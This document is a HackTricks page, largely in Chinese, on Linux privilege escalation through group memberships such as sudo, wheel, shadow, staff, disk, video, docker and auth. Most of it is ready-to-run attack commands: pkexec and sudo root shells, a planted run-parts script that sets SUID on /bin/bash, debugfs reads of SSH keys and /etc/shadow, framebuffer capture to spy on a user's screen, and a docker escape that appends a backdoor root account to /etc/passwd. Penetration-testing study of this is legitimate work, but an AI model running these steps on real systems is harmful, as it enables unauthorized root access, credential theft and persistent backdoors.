# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin 组

### **PE - Method 1**

**有时**，**默认情况下（或因为某些软件需要）**，你可以在 **/etc/sudoers** 文件中找到以下几行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着，**属于 sudo 或 admin 组的任何用户都可以使用 sudo 执行任意操作**。

如果是这种情况，若要 **成为 root，只需执行**：
```
sudo su
```
### PE - Method 2

查找所有 suid binaries，并检查其中是否存在 **Pkexec** binary：
```bash
find / -perm -4000 2>/dev/null
```
如果你发现 **pkexec 是一个 SUID 二进制文件**，并且你属于 **sudo** 或 **admin** 组，那么你可能可以使用 `pkexec` 以 sudo 身份执行二进制文件。\
这是因为这些通常是 **polkit policy** 中的组。该 policy 基本上用于确定哪些组可以使用 `pkexec`。使用以下命令检查：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在那里，你可以找到哪些组被允许执行 **pkexec**，并且在某些 Linux 发行版中，**sudo** 和 **admin** 组默认会出现。

要 **成为 root，可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果你尝试执行 **pkexec** 并收到此 **错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这不是因为你没有权限，而是因为你在没有 GUI 的情况下未建立连接**。此问题的解决方法见：[https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要 **2 个不同的 ssh 会话**：
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**有时**，在 **/etc/sudoers** 文件中默认可以找到以下内容：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着，**属于 wheel 组的任何用户都可以通过 sudo 执行任意操作**。

如果是这种情况，若要**成为 root，只需执行**：
```
sudo su
```
## Shadow Group

**group shadow** 中的用户可以**读取** **/etc/shadow** 文件：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
所以，读取该文件并尝试**破解一些哈希**。

在分析哈希时，需要注意一个快速判断锁定状态的细节：
- 带有 `!` 或 `*` 的条目通常无法通过密码登录进行交互式登录。
- `!hash` 通常表示曾设置过密码，之后被锁定。
- `*` 通常表示从未设置过有效的密码哈希。
即使直接登录被阻止，这些信息仍可用于对账户进行分类。

## Staff Group

**staff**：允许用户在不需要 root 权限的情况下向系统（`/usr/local`）添加本地修改（注意，`/usr/local/bin` 中的可执行文件位于所有用户的 PATH 变量中，并且可能会以同名的 `/bin` 和 `/usr/bin` 中的可执行文件为“优先版本”）。可与组 “adm” 进行比较，后者更多与监控/安全相关。[\\[source\\]](https://wiki.debian.org/SystemGroups)

在 debian 发行版中，`$PATH` 变量表明 `/usr/local/` 将以最高优先级运行，无论你是否为特权用户。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
如果我们可以劫持 `/usr/local` 中的某些程序，就可以轻松获得 root 权限。

劫持 `run-parts` 程序是轻松获得 root 权限的一种方式，因为许多程序都会运行类似 `run-parts` 的命令（例如 crontab、SSH 登录时）。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
或当新的 ssh 会话登录时。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## 磁盘组

此权限几乎**等同于 root access**，因为你可以访问机器内的所有数据。

文件：`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意，使用 debugfs 还可以**写入文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，可以执行：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
不过，如果你尝试**写入由 root 所有的文件**（例如 `/etc/shadow` 或 `/etc/passwd`），就会收到“**Permission denied**”错误。

## Video Group

使用命令 `w` 可以查找**当前登录系统的用户**，并显示类似以下内容的输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 已物理登录**到该机器上的一个终端。

**video group** 可以访问并查看屏幕输出。基本上，你可以观察屏幕内容。为此，你需要以原始数据的形式**获取当前屏幕图像**，并获取屏幕使用的分辨率。屏幕数据可以保存在 `/dev/fb0` 中，你可以在 `/sys/class/graphics/fb0/virtual_size` 中找到该屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开****原始图像**，可以使用 **GIMP**，选择 **`screen.raw`** 文件，并将文件类型选择为 **Raw image data**：

![磁盘组 - 视频组：要打开原始图像，可以使用 GIMP，选择 screen.raw 文件，并将文件类型选择为 Raw image data](<../../../images/image (463).png>)

然后将 Width 和 Height 修改为屏幕所使用的值，并检查不同的 Image Types（选择能够更好显示屏幕内容的类型）：

![磁盘组 - 视频组：然后将 Width 和 Height 修改为屏幕所使用的值，并检查不同的 Image Types（选择能够更好显示屏幕内容的类型）](<../../../images/image (317).png>)

## Root 组

看起来，默认情况下，**root 组的成员**可能有权**修改**某些 **service** 配置文件、某些 **libraries** 文件或其他可能用于提升权限的**有趣内容**……

**检查 root 成员可以修改哪些文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

你可以**将主机的根文件系统挂载到某个实例的卷上**，这样实例启动时会立即将该卷作为 `chroot` 环境加载。这实际上会让你获得该机器上的 root 权限。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
最后，如果你不喜欢之前的任何建议，或者它们因为某些原因无法工作（docker api firewall？），你也可以尝试**运行一个 privileged container 并从中 escape**，具体说明如下：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

如果你对 docker socket 具有写权限，请阅读[**这篇关于如何滥用 docker socket 提升权限的文章**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**。**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 组


{{#ref}}
./
{{#endref}}

## Adm 组

通常，**`adm`** 组的**成员**拥有**读取**位于 _/var/log/_ 内**日志**文件的权限。\
因此，如果你已 compromise 该组中的用户，绝对应该**查看日志**。

## Backup / Operator / lp / Mail 组

这些组通常是**credential-discovery** vectors，而不是直接获取 root 的 vectors：
- **backup**：可能暴露包含配置、密钥、DB dump 或 token 的归档文件。
- **operator**：特定于平台的运维访问权限，可能会 leak 敏感的运行时数据。
- **lp**：打印队列/spool 可能包含文档内容。
- **mail**：邮件 spool 可能暴露重置链接、OTP 和内部凭据。

应将这些组的成员资格视为高价值的数据暴露发现，并通过密码/token reuse 进行 pivot。

## Auth 组

在 OpenBSD 中，如果使用了 **auth** 组，该组通常可以写入 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹。\
这些权限可能被以下 exploit 滥用，从而**将权限提升**至 root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
